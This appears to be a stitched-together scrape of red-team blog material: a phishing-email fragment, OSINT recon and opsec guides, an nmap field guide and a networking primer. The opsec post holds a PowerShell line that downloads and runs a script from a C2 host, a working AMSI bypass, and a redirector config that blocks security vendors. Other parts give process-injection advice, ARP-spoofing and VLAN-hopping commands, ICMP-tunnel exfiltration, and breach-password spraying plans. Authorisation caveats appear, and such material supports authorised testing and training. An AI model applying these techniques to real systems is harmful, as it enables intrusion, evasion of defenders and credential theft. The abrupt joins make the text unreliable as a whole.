could you review the updated migration timeline document? i need your
sign-off before the call with the vendor tomorrow.

[review document] ← links to credential-harvesting phishing page

thanks,
sarah opsec for osint operators your osint activity can expose your identity or tip off the target. managing your own operational security during reconnaissance is essential. protecting your identity # dedicated vm for osint (no personal data)
# separate browser profiles per target
# disable javascript when visiting target sites (js can fingerprint you)
# use a vpn or tor for all queries

# tor for anonymous browsing
torbrowser-launcher

# proxychains for tools
service tor start
proxychains theharvester -d target.com -b google

# vpn — choose a no-log provider, pay anonymously what can expose you passive only — zero footprint # these leave no trace at the target:
- google cache pages (not live site)
- crt.sh, shodan, censys (they scanned, you just query their db)
- whois databases
- archive.org / wayback machine
- breach databases (dehashed, etc.)
- social media public posts (without logging in)
- theharvester (uses search engines as proxies)
- github public repos wayback machine — historical recon https://web.archive.org/web/*/target.com

# find old staff directories, leaked pages, old configs
# useful for: employee emails before privacy was added, old subdomains,
#             pages that were "deleted" but are still indexed

# wayback cdx api — enumerate all archived urls
curl 'http://web.archive.org/cdx/search/cdx?url=*.target.com&output=text&fl=original&collapse=urlkey' \
  | sort -u > archived_urls.txt

# look for: /admin, /config, /backup, /api, /old, /.git
grep -e '/(admin|config|backup|api|old|git)' archived_urls.txt putting it all together — osint workflow a structured recon workflow for an external red team engagement: ### phase 1 — seed data
target="target.com"
org="target corporation"

### phase 2 — domain and infrastructure
whois $target
dig $target any
curl -s "https://crt.sh/?q=%.$target&output=json" | jq -r '.[].name_value' | sort -u
subfinder -d $target -all -o subdomains.txt
theharvester -d $target -b all -f harvest
shodan search "org:\"$org\"" --fields ip_str,port,transport,product

### phase 3 — email and personnel
# hunter.io: find email format for $target
# linkedin: enumerate employees by company
# theharvester output: extract email list
grep '@' harvest.txt | sort -u > emails.txt

### phase 4 — breach data
# dehashed.com: search email:@$target → export all records
# intelx.io: search $target
# check hibp for each email

### phase 5 — code and documents
theharvester -d $target -b github
# github: search org:target-corp secret password api
trufflehog github --org=target-org
metagoofil -d $target -t pdf,doc,xlsx -o metadata/

### phase 6 — profile and plan
# build list of:
# - external services (vpn, owa, citrix, jenkins, jira) from shodan + subdomains
# - confirmed employees + emails + breach passwords
# - technology stack (from shodan, linkedin job posts, document metadata)
# - attack paths: spray, stuff, phish, exposed service exploit

### document everything with timestamps
# maintain an engagement notes file:
# date | finding | source | confidence | attack path legal and ethical boundaries osint uses only public data — but that doesn't mean all osint is legal or ethical in all contexts.

**what is clearly legal:**
- searching public websites, social media, company filings
- using public databases (whois, crt.sh, shodan)
- reading publicly available breach data for defensive purposes
- conducting authorised red team reconnaissance within scope

**what requires explicit authorisation:**
- any reconnaissance against a client's systems (written scope of work)
- using breach data to attempt authentication against live systems
- social engineering employees
- physical reconnaissance of premises

**jurisdiction matters:**
- gdpr (eu) — personal data of eu residents has protections even when publicly available
- cfaa (us) — accessing systems without authorisation, even for osint, can violate the act
- uk computer misuse act — similar to cfaa

**always have written authorisation before starting any recon against a real target.**

in authorised engagements, document every finding with source and timestamp. this protects both you and your client if findings become part of legal proceedings or regulatory review.

title: OPSEC for Pentesters — Don't Be the Noise You're Hunting
summary: Operational security is not paranoia — it is discipline. Covers the five-step OPSEC process, infrastructure setup, redirectors, avoiding attribution, communicat
body:
opsec for pentesters — don't be the noise you're hunting operational security is not paranoia — it is discipline. covers the five-step opsec process, infrastructure setup, redirectors, avoiding attribution, communication hygiene, and the mistakes that burn engagements and operators alike. security opsec red-team pentest c2 infrastructure attribution tradecraft opsec — operational security — originated in u.s. military doctrine and entered offensive security as operators realised that burning your infrastructure mid-engagement or leaving attributable traces is not just embarrassing, it is professionally negligent.

for pentesters and red teamers, opsec has two dimensions: protecting your engagement from premature detection by the client's security team (so you can finish the job), and ensuring your tooling and infrastructure cannot be attributed back to you or your firm by third parties. both matter. both are frequently ignored.

this post is a practitioner's checklist — built from real engagement mistakes, incident response reports that identified red team infrastructure, and the patterns that consistently burn operators. the five-step opsec process the military model translates directly to offensive security engagements: 1. identify critical information
   what, if discovered by the defender, would end the engagement or expose the operator?
   → c2 infrastructure ip addresses
   → team member real identities / email addresses
   → tooling signatures (cobalt strike watermarks, metasploit default stagers)
   → engagement scope documents stored insecurely

2. analyse threats
   who are the threat actors (from the perspective of your operation)?
   → client's blue team / soc
   → client's third-party mdr
   → network monitoring tools (ids/ips, ndr)
   → endpoint telemetry (edr, sysmon, auditd)

3. analyse vulnerabilities
   where are the gaps in your own security posture?
   → default tool configurations (beacon sleep timers, user-agent strings)
   → reuse of infrastructure across engagements
   → cleartext tool output in engagement logs
   → weak/shared passwords on team infrastructure

4. assess risk
   likelihood × impact for each vulnerability
   → default c2 profile: high likelihood of detection, high impact (engagement burned)
   → real name in certificate: low likelihood of detection by client, high impact if discovered

5. apply countermeasures
   reduce risk to acceptable level — the rest of this post pre-engagement opsec checklist work through this before any engagement starts. items marked ✗ are common failure modes observed in post-engagement reviews. **identity and communication**

✓ engagement email uses a domain separate from your firm's primary domain — not `operator@redteamfirm.com`
✓ engagement voip numbers not traceable to personal accounts
✓ all client communications over encrypted channels (signal, protonmail) where possible
✓ scope document stored encrypted at rest — not in a shared google drive accessible to all staff
✗ using personal social media to discuss engagement progress (seen multiple times — don't)
✗ engagement notes synced to a personal icloud/google account on a work machine **infrastructure — build before every engagement**

✓ fresh vps provisioned for each engagement — never reuse c2 infrastructure
✓ vps purchased with payment method not tied to personal identity (privacy-focused vps providers)
✓ all engagement infrastructure registered and controlled from a dedicated, air-gapped management host
✓ c2 listener sits behind at least one redirector — the vps your c2 runs on never appears in logs
✓ domain for phishing or c2 aged minimum 30 days before use (fresh domains trigger reputation checks)
✓ domain has valid mx records, a records, and a believable parked page before use
✗ pointing your c2 domain directly at your c2 vps ip (first thing an ir team will pivot to)
✗ using the same ip block across engagements (threat intel feeds correlate operator infrastructure) **tooling hygiene**

✓ custom c2 profile — not the default cobalt strike or havoc profile (default profiles are signatured by every major edr)
✓ payloads compiled fresh for each engagement — static hash of your beacon should change
✓ staged vs stageless payloads: staged is smaller but the stager traffic is detectable; stageless is safer for mature environments
✓ user-agent strings in c2 profile match legitimate browser ua for the target environment
✓ http callbacks mimic legitimate software update patterns — not `/connect` every 60 seconds
✗ using `windows/meterpreter/reverse_tcp` against any environment with an edr (it will die instantly)
✗ running mimikatz off disk without modification — every edr catches this now c2 infrastructure architecture a properly built engagement infrastructure ensures that if any component is discovered and investigated, the trail stops there and does not lead to your actual c2 server or your identity.                     internet
                       │
           ┌───────────┴──────────────┐
           │                          │
    https redirector           dns redirector
   (nginx/caddy vps)          (bind on vps)
    [public-facing]            [public-facing]
           │                          │
    iptables forward          dns forward
           │                          │
    ╔══════╧══════════════════════════╧══════╗
    ║          private vpn tunnel             ║
    ║         (wireguard, not openvpn)        ║
    ╚══════╤══════════════════════════╤══════╝
           │                          │
      c2 team server             dns c2 server
     (cobalt strike /           (iodine / dnscat2)
      havoc / sliver)            — backup channel
     [never internet-facing]
           │
    management host
    (operator workstation
     on vpn only) nginx redirector — basic config # /etc/nginx/sites-available/redirector
# purpose: forward c2 traffic to team server, drop everything else

server {
    listen 443 ssl;
    server_name legitimate-looking-domain.com;

    ssl_certificate     /etc/letsencrypt/live/legitimate-looking-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/legitimate-looking-domain.com/privkey.pem;

    # only forward requests matching your c2 uri pattern
    # everything else gets a 404 or redirected to a real site
    location /api/v2/analytics {
        proxy_pass https://10.8.0.2:443;  # team server on vpn
        proxy_set_header host $host;
        proxy_set_header x-forwarded-for $remote_addr;
    }

    # default: looks like a real website
    location / {
        return 301 https://www.microsoft.com$request_uri;
        # or proxy to a real benign site to make the redirector look legitimate
    }

    # block known security vendor ip ranges and sandbox ips
    # (populate from threat intel — vendors will probe your infrastructure)
    deny 199.66.11.0/24;   # virustotal
    deny 216.239.32.0/24;  # google safe browsing
} domain selection and aging # check domain reputation before use
# a fresh domain with no history will fail many reputation checks

# virustotal domain check
curl -s 'https://www.virustotal.com/api/v3/domains/yourdomain.com' \
  -h 'x-apikey: your_key' | python3 -m json.tool | grep -a5 'last_analysis_stats'

# check domain age and historical use
whois yourdomain.com | grep -i 'creation\|updated\|registrar'

# verify domain categorisation (should be uncategorised or benign, not 'newly registered')
# check against: cloudflare, cisco umbrella, blue coat categories
curl -s 'https://domain.opendns.com/yourdomain.com'

# build credibility: before using a domain for c2, set up:
# 1. a/aaaa records pointing to a real-looking web server
# 2. mx records (even if they don't route mail)
# 3. a robots.txt and favicon.ico
# 4. cloudflare proxy (hides real ip, adds legitimacy)
# 5. let it age 30+ days — automated systems de-flag it

# dns records for a convincing parked domain
# @ a 104.21.x.x  (cloudflare)
# www a 104.21.x.x
# mail mx 10 mail.yourdomain.com
# @ txt v=spf1 include:_spf.google.com ~all in-engagement opsec checklist **during active operations**

✓ check c2 callback patterns match your malleable profile — anomalous timing burns beacons
✓ use long sleep timers (1–4 hours) during low-priority dwell, short (1–5 min) only during active operations
✓ jitter set to 30–50% on all beacons — regular intervals are trivially signatured
✓ exfiltrate data in small chunks over extended time — bulk transfer triggers dlp and ndr anomalies
✓ blend into legitimate traffic — exfil via https to legitimate cloud services where possible
✓ log every action with timestamp — if you get caught, your team needs to reconstruct exactly what happened
✗ running loud enumeration tools (bloodhound ingestor, nmap) without coordinating with blue team timing
✗ leaving interactive shell sessions open — sleep the beacon, don't park a shell **tool execution opsec**

✓ prefer in-memory execution — avoid writing tools to disk where possible
✓ use process injection into legitimate processes (svchost.exe, explorer.exe) rather than spawning attacker-named processes
✓ parent process spoofing: spawn processes with a legitimate parent (explorer.exe) not your current shell
✓ ppid spoofing, token manipulation, and api unhooking should be in your standard toolkit for mature environments
✗ dropping mimikatz or rubeus to c:\windows\temp — edr kills it immediately and the filename is in logs forever
✗ using your operator machine's real hostname in tool output — impacket embeds the attacker hostname in smb traffic in-memory execution examples # execute from memory — never touches disk
# note: most edrs now scan memory too, but avoids file-based av and fim alerts

# load rubeus in-memory via cobalt strike (execute-assembly)
execute-assembly /tools/rubeus.exe kerberoast /nowrap

# powershell in-memory load (bypasses execution policy, not amsi)
$code = (new-object net.webclient).downloadstring('https://c2.domain/tool.ps1')
[scriptblock]::create($code).invoke()
# note: scriptblock logging (eid 4104) will still capture this — amsi patches memory

# amsi bypass — patches amsi.dll in current process memory
# (varies by windows version — rotate bypass as detections catch up)
$a = [ref].assembly.gettype('system.management.automation.amsiutils')
$b = $a.getfield('amsiinitfailed','nonpublic,static')
$b.setvalue($null,$true)

# cobalt strike — fork-and-run vs in-process
# default: fork-and-run (spawns sacrificial process)
# better for opsec: in-process via spawnto and execute-assembly
spawnto x64 %windir%\sysnative\dllhost.exe
execute-assembly /tools/sharphound.exe -c all post-engagement cleanup checklist **mandatory before signing off**

✓ all beacons killed and confirmed dead — check c2 dashboard for any remaining callbacks
✓ all persistence mechanisms removed: registry keys, scheduled tasks, services, wmi subscriptions
✓ all dropped files deleted — hash the dropped locations to confirm deletion
✓ all created user accounts removed
✓ any firewall rules modified — reverted
✓ all redirector vps infrastructure destroyed (snapshot evidence first for the report)
✓ engagement notes encrypted and archived — not sitting in plaintext on a shared drive
✓ inform client ir team of exact indicators: all c2 ips, domains, payload hashes, user accounts — so they can confirm your cleanup
✗ assuming beacons are dead because you stopped seeing callbacks — verify with `jobs` and `sessions` in your c2
✗ forgetting to remove the dns entry for your phishing domain — it persists and can be pivoted to common attribution mistakes (real engagement failures) a red team that gets caught by the client's blue team before completing objectives is a failed engagement — but it is not a disaster. a red team that leaves attributable infrastructure connected to real identities, or fails to clean up persistence mechanisms, is a liability. good opsec protects the client's environment as much as it protects the operator. clean up is not optional — it is the last deliverable of every engagement.

title: Nmap — Field Guide
summary: Scan types, essential flags, NSE scripts, and ready-to-run examples for network discovery, service enumeration, and CTF recon.
body:
nmap — field guide scan types, essential flags, nse scripts, and ready-to-run examples for network discovery, service enumeration, and ctf recon. tools nmap recon scanning network tools what is nmap nmap (*network mapper*) is the industry-standard tool for host discovery, port scanning, service fingerprinting, os detection, and scripted vulnerability checks. it's the first tool you run on a new target — whether that's an internal network audit, a bug bounty scope, or a hackthebox machine.

basic syntax: nmap [scan type] [options] <target> target can be an ip (`10.10.10.5`), a range (`10.10.10.0/24`), a list (`-il hosts.txt`), or a hostname. scan types # syn scan (requires root/sudo)
sudo nmap -ss 10.10.10.5

# tcp connect scan (no root needed)
nmap -st 10.10.10.5

# udp scan — slow, run on top ports only
sudo nmap -su --top-ports 100 10.10.10.5

# combine tcp + udp
sudo nmap -ss -su 10.10.10.5

# ack scan to check firewall filtering
sudo nmap -sa 10.10.10.5 port selection # single port
nmap -p 80 10.10.10.5

# range
nmap -p 1-1000 10.10.10.5

# comma-separated list
nmap -p 22,80,443,8080,8443 10.10.10.5

# all 65535 ports (thorough but slow)
nmap -p- 10.10.10.5

# top n most common ports
nmap --top-ports 1000 10.10.10.5

# fast scan — top 100 ports only
nmap -f 10.10.10.5

# only show open ports (suppress filtered/closed noise)
nmap --open 10.10.10.5 timing & performance nmap's `-t` flag controls the timing template — a balance between speed and stealth/reliability. for htb/ctf: use `-t4`. for real-world pentests on production: stick to `-t3` or lower. # fast recon on a ctf box
sudo nmap -t4 -p- 10.10.10.5

# slow stealth scan to avoid ids alerts
sudo nmap -t1 -ss 192.168.1.0/24

# parallel host probing (--min-parallelism speeds up subnet scans)
sudo nmap -t4 --min-parallelism 50 192.168.1.0/24 host discovery before scanning ports, nmap pings hosts to check if they're alive. these flags control that behaviour. # ping sweep — find live hosts on a subnet (no port scan)
sudo nmap -sn 192.168.1.0/24

# skip ping check — treat host as up (useful when icmp is blocked)
sudo nmap -pn 10.10.10.5

# no dns resolution (faster, avoids dns logging)
nmap -n 10.10.10.5

# scan from a list of targets
nmap -il targets.txt

# exclude specific hosts from a range
nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.254 service & os detection # service version detection
nmap -sv 10.10.10.5

# os detection (requires root)
sudo nmap -o 10.10.10.5

# aggressive mode: -sv + -o + -sc + traceroute
sudo nmap -a 10.10.10.5

# crank up version probe intensity (0-9, default 7)
nmap -sv --version-intensity 9 10.10.10.5

# verbose output — see what nmap is doing live
nmap -v -sv 10.10.10.5
nmap -vv -sv 10.10.10.5  # even more verbose nmap script engine (nse) nse scripts extend nmap's capabilities with service enumeration, vulnerability detection, brute-force, and more. scripts live in `/usr/share/nmap/scripts/`.

**script categories:** # run default scripts (same as -sc)
nmap --script default 10.10.10.5

# vulnerability scan
sudo nmap --script vuln 10.10.10.5

# check for eternalblue (ms17-010)
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.5

# http enumeration
nmap --script http-title,http-headers,http-methods -p 80,443,8080 10.10.10.5

# ftp anonymous login check
nmap --script ftp-anon -p 21 10.10.10.5

# ssh supported auth methods
nmap --script ssh-auth-methods -p 22 10.10.10.5

# smb enumeration
nmap --script smb-enum-shares,smb-enum-users -p 445 10.10.10.5

# ssl/tls certificate info
nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.5

# run all scripts in a category
sudo nmap --script discovery 10.10.10.5

# pass arguments to a script
nmap --script http-brute --script-args userdb=users.txt,passdb=pass.txt -p 80 10.10.10.5 output & saving results # normal text output
nmap -on scan.txt 10.10.10.5

# xml output (importable into metasploit, etc.)
nmap -ox scan.xml 10.10.10.5

# grepable output
nmap -og scan.gnmap 10.10.10.5

# all three at once (recommended — saves everything)
nmap -oa scan 10.10.10.5
# produces: scan.nmap, scan.xml, scan.gnmap

# resume an interrupted scan
nmap --resume scan.gnmap real-world use cases **network asset inventory** — discover what's running across a subnet before an audit. # ping sweep to find live hosts first
sudo nmap -sn 10.0.0.0/24 -og alive.gnmap
grep 'up' alive.gnmap | awk '{print $2}' > live_hosts.txt

# full version + script scan on live hosts
sudo nmap -ss -sv -sc -t3 -p- -oa full_audit -il live_hosts.txt **firewall validation** — confirm that only intended ports are reachable from outside. # check which ports respond vs which are filtered
sudo nmap -sa -p 22,80,443,3306,5432 10.0.0.1

# test firewall bypass with fragmented packets
sudo nmap -f -ss 10.0.0.1

# decoy scan to obscure source ip (mix real ip with decoys)
sudo nmap -d 192.168.1.50,192.168.1.51,me 10.0.0.1 **scheduled monitoring** — lightweight recurring scan to detect unexpected new open ports. # quick top-100-ports scan, grepable output, no dns
sudo nmap -n -t3 --top-ports 100 --open -og - 10.0.0.0/24 \
  | grep 'ports:' >> port_history.log ctf & hackthebox workflow on ctf boxes, the goal is speed and completeness. a two-phase approach works well: fast scan first to find low-hanging fruit, then a thorough scan in the background. export ip=10.10.10.5

# phase 1 — fast top-port scan while you read the box description
sudo nmap -ss -t4 --top-ports 1000 --open -on fast_$ip.txt $ip

# phase 2 — full port scan in background
sudo nmap -ss -t4 -p- --open -on allports_$ip.txt $ip &

# phase 3 — version + default scripts on discovered ports
# (replace 22,80,443 with what phase 1 found)
sudo nmap -sv -sc -p 22,80,443 -on services_$ip.txt $ip

# phase 4 — udp top ports (often reveals snmp, nfs, etc.)
sudo nmap -su --top-ports 50 -on udp_$ip.txt $ip # all-in-one aggressive scan (good first scan on a known-safe htb box)
sudo nmap -a -t4 -p- --open $ip

# check for common cves quickly
sudo nmap --script vuln -p $(cat allports_$ip.txt | grep open | cut -d/ -f1 | tr '\n' ',') $ip

# smb deep dive
nmap --script smb-vuln-ms17-010,smb-enum-shares,smb-os-discovery -p 445 $ip

# web enumeration combo
nmap --script http-title,http-auth-finder,http-methods,http-robots.txt -p 80,443,8080,8443 $ip **always save output** with `-oa scanname` — you'll want to grep it later.  
**skip ping** with `-pn` when a host is alive but not responding to icmp.  
**add `-n`** to skip dns lookups on internal/ctf scans — noticeably faster.  
**`-sv` slows things down** — run it only on ports you've already confirmed open.  
**root/sudo** is required for syn (`-ss`), udp (`-su`), and os detection (`-o`).

title: Networking & Subnetting — The Complete Foundation
summary: OSI model, TCP/IP stack, IPv4 addressing, CIDR subnetting, protocols, ARP, routing, NAT, VLANs, and a red team lens on every layer.
body:
networking & subnetting — the complete foundation osi model, tcp/ip stack, ipv4 addressing, cidr subnetting, protocols, arp, routing, nat, vlans, and a red team lens on every layer. learn networking subnetting tcp-ip osi red-team fundamentals networking is the invisible foundation underneath every engagement, ctf, and piece of infrastructure. you cannot do meaningful reconnaissance, exploitation, or lateral movement without understanding how data actually travels between machines.

this guide builds from zero — osi layers, ip addresses, subnets — up through the concepts that directly matter in practice: reading a cidr range, understanding a tcp handshake, spotting a misconfigured network. red team notes are woven throughout, not bolted on at the end. the osi model the **osi (open systems interconnection)** model is a conceptual framework that divides network communication into seven layers. every real protocol lives at one or more of these layers, and understanding the stack is essential for knowing *where* something can go wrong — or be attacked. **mnemonic:** *please do not throw sausage pizza away* (layers 1→7).

**why it matters for attackers:**
- layer 2 attacks: arp poisoning, mac flooding, vlan hopping
- layer 3 attacks: ip spoofing, icmp redirects, route injection
- layer 4 attacks: tcp syn floods, port scanning, session hijacking
- layer 7 attacks: sqli, xss, ssrf, every web vulnerability you know

when you run `nmap`, you're operating at layers 3–4. when you intercept with burp suite, you're at layer 7. knowing which layer you're touching changes what tools you use and what defenses exist. the tcp/ip model the **tcp/ip model** (also called the internet model) is the practical implementation — four layers that map to the osi seven. this is what real operating systems implement. data travels *down* the stack on the sender (encapsulation) and *up* on the receiver (decapsulation). each layer wraps the data from the layer above with its own header: application data
  → [tcp header] + data          (segment)
  → [ip header] + segment         (packet)
  → [ethernet header] + packet    (frame)
  → bits on the wire this is called **encapsulation**. when you capture with wireshark you're reading these headers at every layer simultaneously. ipv4 addressing every device on a network needs a unique logical address — the **ip address**. ipv4 uses 32 bits, written as four octets (groups of 8 bits) in dotted decimal. 192.168.1.100
│   │   │ │
│   │   │ └─ 4th octet  (0–255)
│   │   └─── 3rd octet  (0–255)
│   └─────── 2nd octet  (0–255)
└─────────── 1st octet  (0–255) **in binary:** 192     .168     .1       .100
11000000.10101000.00000001.01100100 every ipv4 address has two parts: the **network portion** and the **host portion**. the subnet mask defines where the split is. address classes (historical, mostly replaced by cidr) private (rfc 1918) ranges these are non-routable on the public internet — you'll see them constantly on internal networks and in ctfs: **special addresses:**
- `127.0.0.1` — loopback (localhost)
- `169.254.x.x` — apipa (link-local, no dhcp response)
- `0.0.0.0` — unspecified / wildcard listener
- `255.255.255.255` — limited broadcast subnet masks & cidr notation a **subnet mask** is a 32-bit number where all network bits are `1` and all host bits are `0`. it tells you which part of an ip address is the network address.

**cidr (classless inter-domain routing)** notation writes the mask as a prefix length — the count of leading 1 bits. `/30` is common for point-to-point links (2 usable hosts). `/32` means a single host — you'll see this in routing tables and firewall rules. subnet math — step by step given `192.168.10.75/26`, find the network address, broadcast, usable range, and number of hosts.

**step 1 — find the block size**
the last octet mask bits: `/26` means 26 bits total, the last octet contributes `26 - 24 = 2` bits. so the mask in the last octet is `11000000` = **192**. block size = `256 - 192 = 64`.

**step 2 — find the network address**
divide the host octet (75) by the block size (64): `75 / 64 = 1` remainder 11. the network starts at `1 × 64 = 64`.
→ network: `192.168.10.64`

**step 3 — broadcast address**
network address + block size - 1: `64 + 64 - 1 = 127`
→ broadcast: `192.168.10.127`

**step 4 — usable host range**
first usable: network + 1 → `192.168.10.65`
last usable: broadcast - 1 → `192.168.10.126`

**step 5 — number of hosts**
host bits = `32 - 26 = 6`. hosts = `2^6 - 2 = 62` usable.

**summary for .75/26:** quick reference: hosts per prefix # ipcalc — fast subnet breakdown
ipcalc 192.168.10.75/26
ipcalc 10.0.0.0/8

# sipcalc — detailed info
sipcalc 172.16.0.0/12

# python one-liner
python3 -c "import ipaddress; n=ipaddress.ip_network('192.168.10.64/26',strict=false); print(n.network_address, n.broadcast_address, list(n.hosts())[0], list(n.hosts())[-1], n.num_addresses-2)"

# python — iterate all subnets in a block
python3 -c "
import ipaddress
net = ipaddress.ip_network('10.0.0.0/16')
for sub in net.subnets(new_prefix=24):
    print(sub)
"

# check if an ip is in a subnet
python3 -c "import ipaddress; print(ipaddress.ip_address('10.10.10.50') in ipaddress.ip_network('10.10.10.0/24'))" tcp — transmission control protocol **tcp** is connection-oriented, reliable, and ordered. it guarantees that data arrives in the right order and retransmits lost segments. used by http, https, ssh, ftp, smtp — anything where reliability matters. the three-way handshake before any data is exchanged, tcp establishes a connection: client                          server
  │──── syn (seq=x) ──────────────▶│   "i want to connect"
  │◀─── syn-ack (seq=y, ack=x+1) ─│   "ok, and i'm ready"
  │──── ack (ack=y+1) ────────────▶│   "acknowledged"
  │                                 │
  │══════ data flows both ways ═════│ tcp flags tcp connection teardown client                          server
  │──── fin ──────────────────────▶│
  │◀─── ack ───────────────────────│
  │◀─── fin ───────────────────────│
  │──── ack ──────────────────────▶│ **rst** immediately terminates without the four-way close. firewalls inject rsts to kill disallowed connections. nmap uses rst responses to detect closed ports. udp — user datagram protocol **udp** is connectionless and unreliable — fire and forget. no handshake, no retransmit, no ordering guarantee. much faster overhead than tcp. used by dns (port 53), dhcp (67/68), snmp (161), ntp (123), and any application that tolerates loss (video streams, voip, games).

**from an attacker perspective:**
- udp services are slower to scan (no rst on closed ports — just icmp unreachable or silence)
- udp often has less visibility in logs
- snmp on udp 161 is frequently misconfigured with default community strings (`public`, `private`)
- dns on udp 53 can be abused for amplification ddos and tunneling
- tftp (udp 69) sometimes left open on network devices — no authentication icmp — internet control message protocol **icmp** is the network's diagnostic protocol — it carries error messages and operational information. it has no ports; it uses type and code numbers instead. **red team uses of icmp:**
- `ping` for host discovery when tcp/udp is filtered
- `traceroute` / `tracert` maps network hops to reveal routers and segmentation
- icmp tunneling (`ptunnel`, `icmptunnel`) — exfiltrate data or c2 through firewalls that allow icmp
- icmp type 3 code 3 (port unreachable) confirms a host is up but port is closed # basic ping
ping -c 4 10.10.10.1

# ping sweep a /24 (bash)
for i in $(seq 1 254); do
  ping -c1 -w1 192.168.1.$i &>/dev/null && echo "192.168.1.$i up" &
done; wait

# fping — fast concurrent ping sweep
fping -ag 10.10.10.0/24 2>/dev/null

# traceroute (linux)
traceroute 8.8.8.8
traceroute -t -p 80 8.8.8.8   # tcp syn traceroute (bypasses icmp blocks)

# mtr — live traceroute
mtr --report 8.8.8.8

# icmp tunnel (data exfiltration channel)
# server side
ptunnel-ng -v 5
# client side
ptunnel-ng -p <server_ip> -lp 8080 -da <destination> -dp 22 common ports — cheat sheet memorise these. you will see them every single engagement. arp — address resolution protocol when a device knows the **ip address** of the next hop but needs the **mac address** to actually send a frame on ethernet, it uses **arp**. host a wants to reach 192.168.1.5

a → (broadcast) "who has 192.168.1.5? tell 192.168.1.1"
b ← (unicast)   "192.168.1.5 is at aa:bb:cc:dd:ee:ff"

a caches: 192.168.1.5 → aa:bb:cc:dd:ee:ff  (arp table / arp cache) arp has **no authentication**. any host can reply to any arp request — or send **gratuitous arps** unprompted to overwrite entries. arp poisoning (arp spoofing) send forged arp replies to two targets, telling each that *you* are the other: attacker tells victim:  "the gateway (192.168.1.1) is at my mac"
attacker tells gateway: "victim (192.168.1.100) is at my mac"

result: all traffic routes through attacker → man-in-the-middle tools: **arpspoof** (dsniff), **ettercap**, **bettercap**, **scapy**. # view your arp cache
arp -n
ip neigh

# arp scan — discover hosts on local segment (faster than ping sweep)
arp-scan --localnet
arp-scan 192.168.1.0/24 -i eth0

# nmap arp discovery (requires root)
nmap -sn 192.168.1.0/24 --send-ip

# arp poisoning with arpspoof (enable ip forwarding first!)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # tell victim attacker = gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # tell gateway attacker = victim

# bettercap — arp spoof + sniff
bettercap -iface eth0
# in bettercap:
# net.probe on
# set arp.spoof.targets 192.168.1.100
# arp.spoof on
# net.sniff on routing & the default gateway a **router** connects networks. when a packet's destination is outside the local subnet, the sender forwards it to the **default gateway** — the router's ip on the local segment. how a host decides where to send a packet 1. is the destination in the same subnet? → send directly (arp for mac, then ethernet frame)
2. not in the same subnet? → send to default gateway (router handles it from there) the routing table every device (host or router) has a routing table. routers match the most specific (longest prefix) route. destination      gateway       mask        interface
0.0.0.0          192.168.1.1   0.0.0.0     eth0     ← default route
192.168.1.0      0.0.0.0       /24         eth0     ← local subnet (direct)
10.0.0.0         192.168.1.254 /8          eth0     ← static route to 10.x.x.x # linux — view routing table
ip route show
route -n

# windows
route print
ipconfig /all         # includes default gateway

# add a static route (linux)
ip route add 10.10.0.0/16 via 192.168.1.254 dev eth0

# add a static route (windows)
route add 10.10.0.0 mask 255.255.0.0 192.168.1.254

# trace the path a packet takes
traceroute 8.8.8.8

# red team: read routes on a compromised host to map internal segments
# found 10.0.0.0/8 via a pivot? that's your lateral movement target nat — network address translation **nat** allows many devices with private (rfc 1918) addresses to share a single public ip. the router rewrites source ips and tracks state in a nat table. internal:  192.168.1.50:4231  ──→  nat router  ──→  public: 203.0.113.1:4231
                                    (rewrites src ip)
response:  203.0.113.1:4231  ──→  nat router  ──→  192.168.1.50:4231
                                    (looks up state, rewrites dst) **types of nat:**
- **snat (source nat / masquerade)** — outbound traffic; your home router does this
- **dnat (destination nat / port forwarding)** — inbound, maps external port to internal host
- **pat (port address translation)** — many-to-one, uses port numbers to track flows

**red team implications:**
- hosts behind nat are not directly reachable from the internet — you need a pivot or dnat entry
- port forwarding rules expose internal services: find these in router configs
- nat can hide internal network topology, but routes and arp tables on a pivot reveal it
- double nat (nat inside nat) is common in cloud environments and vms vlans — virtual local area networks **vlans** segment a physical network into isolated logical networks at layer 2. devices on vlan 10 cannot directly communicate with devices on vlan 20 without a router (or layer 3 switch) — even if they share the same physical switch.

**802.1q tagging** — switches insert a 4-byte tag into the ethernet frame header containing the vlan id (1–4094).

**trunk ports** carry multiple vlans (tagged). **access ports** belong to a single vlan (untagged to the device). vlan hopping two main techniques to jump between vlans without going through a router:

**1. switch spoofing** — trick the switch into forming a trunk link with your machine by sending dtp (dynamic trunking protocol) frames. once trunking, you send/receive tagged frames for any vlan.

**2. double tagging** — embed two 802.1q tags. the outer tag matches the native vlan (stripped by the first switch). the inner tag targets the victim vlan (forwarded by the second switch). only works one-way.

**mitigations:** disable dtp (`switchport nonegotiate`), set native vlan to an unused id, disable unused ports, use port security. # create a vlan interface on linux (for testing/pivoting)
modprobe 8021q
ip link add link eth0 name eth0.20 type vlan id 20
ip addr add 10.20.0.100/24 dev eth0.20
ip link set eth0.20 up

# enumerate vlans via cdp/lldp on a trunk port
yersinia -g   # gui — sends dtp, cdp, lldp frames

# vlan hopping with yersinia (switch spoofing attack)
yersinia dtp -attack 1 -interface eth0

# scapy — manual double-tag packet
python3 -c "
from scapy.all import *
pkt = ether()/dot1q(vlan=1)/dot1q(vlan=20)/ip(dst='10.20.0.1')/icmp()
sendp(pkt, iface='eth0')
"

# after gaining trunk access — scan a target vlan
nmap -e eth0.20 -sn 10.20.0.0/24 ipv6 basics ipv6 uses 128-bit addresses written as eight groups of four hex digits separated by colons. double colon `::` compresses consecutive all-zero groups. 2001:0db8:0000:0000:0000:ff00:0042:8329
→ 2001:db8::ff00:42:8329  (compressed) **important ipv6 address types:** **link-local addresses** (`fe80::`) are automatically assigned to every ipv6-capable interface using the eui-64 algorithm (derived from the mac address). this is significant: you can often determine a device's mac from its link-local address.

**red team notes:**
- ipv6 is often overlooked in firewalls and monitoring — separate rulesets required
- ipv6 is enabled by default on modern windows/linux even on ipv4-only networks
- **ndp (neighbour discovery protocol)** replaces arp — same poisoning attacks apply (`radvd`, `thc-ipv6`, fake ra messages)
- tools: `ping6`, `nmap -6`, `thc-ipv6` suite # view ipv6 addresses
ip -6 addr show

# ping6
ping6 -c 3 ::1
ping6 -c 3 fe80::1%eth0   # link-local requires interface scope

# nmap ipv6 scan
